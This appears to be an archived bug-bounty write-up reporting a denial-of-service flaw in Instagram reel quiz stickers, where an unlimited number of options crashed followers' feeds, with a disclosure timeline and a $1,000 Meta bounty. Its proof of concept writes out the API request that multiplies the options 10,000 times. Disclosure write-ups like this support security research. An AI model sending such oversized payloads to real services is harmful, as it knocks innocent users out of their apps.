---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-07-22_permanent-crash-instagram-followers.md
original_filename: 2022-07-22_permanent-crash-instagram-followers.md
title: Permanent Crash Instagram Followers.
category: documents
detected_topics:
- command-injection
tags:
- imported
- documents
- command-injection
language: en
raw_sha256: 1a97b8ad85f45c14257d1fd2fd669ca5d64bbd81593d41ed3be48c6a63aa86c8
text_sha256: 940b21389be09bdbc853116b4843d2692d3403d6dadbc3d138d8247970c5e0bf
ingested_at: '2026-06-28T07:32:12Z'
sensitivity: unknown
redactions_applied: false
---

# Permanent Crash Instagram Followers.

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-07-22_permanent-crash-instagram-followers.md
- Source Type: markdown
- Detected Topics: command-injection
- Ingested At: 2026-06-28T07:32:12Z
- Redactions Applied: False
- Raw SHA256: `1a97b8ad85f45c14257d1fd2fd669ca5d64bbd81593d41ed3be48c6a63aa86c8`
- Text SHA256: `940b21389be09bdbc853116b4843d2692d3403d6dadbc3d138d8247970c5e0bf`


## Content

---
title: "Permanent Crash Instagram Followers."
page_title: "Permanent Crash Instagram Followers"
url: "https://www.yesnaveen.com/2022/07/permanently-crash-instagram-followers.html"
final_url: "https://www.naveen.sh/2022/07/permanently-crash-instagram-followers.html"
authors: ["Naveen (@NaveenHax)"]
programs: ["Meta / Facebook"]
bugs: ["DoS"]
bounty: "1,000"
publication_date: "2022-07-22"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2415
---

###  Permanent Crash Instagram Followers 

### 

### Description

On Instagram there is a feature to add stickers on reels, one of the stickers was vulnerable to DoS due to no char limit.

  

### Impact

An attacker could crash the news feed of his followers without any user interaction, resulting in Permanent DoS where the victim can no longer use the Instagram app.

  

### Proof of Concept

  * Create a reel with a quiz sticker and clone the quiz options to *10000 in the following request

  
  
  POST
  i.instagram.com/api/v1/media/configure_with_clips/
  
  signed_body={"question":"foo","options":[{"text":"bar","count":0},
  {"text":"bar","count":0},{"text":"bar","count":0},
  {"text":"bar","count":0}*10000]
  

### Timeline

17 June 2022 - Report sent  
20 June 2022 - Need More Info  
28 June 2022 - Triaged  
15 July 2022 - $1000 Bounty rewarded by Meta

[ July 22, 2022  ](https://www.naveen.sh/2022/07/permanently-crash-instagram-followers.html "permanent link")
